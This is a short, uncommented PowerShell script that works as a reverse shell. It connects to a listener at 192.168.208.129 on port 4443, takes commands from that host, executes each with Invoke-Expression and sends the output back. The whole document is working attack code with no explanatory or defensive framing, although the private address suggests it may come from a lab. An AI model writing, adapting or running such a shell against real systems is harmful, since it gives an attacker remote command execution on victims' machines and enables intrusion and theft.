$server = '192.168.208.129'
$port = 4443

$client = New-Object System.Net.Sockets.TCPClient($server, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

try {
    while ($true) {
        $command = $reader.ReadLine()
        if ($command -eq 'exit') {
            break
        }

        $result = Invoke-Expression $command 2>&1 | Out-String
        $writer.WriteLine($result)
    }
} catch {
    $writer.WriteLine("Error: $_")
}

$reader.Close()
$writer.Close()
$client.Close()
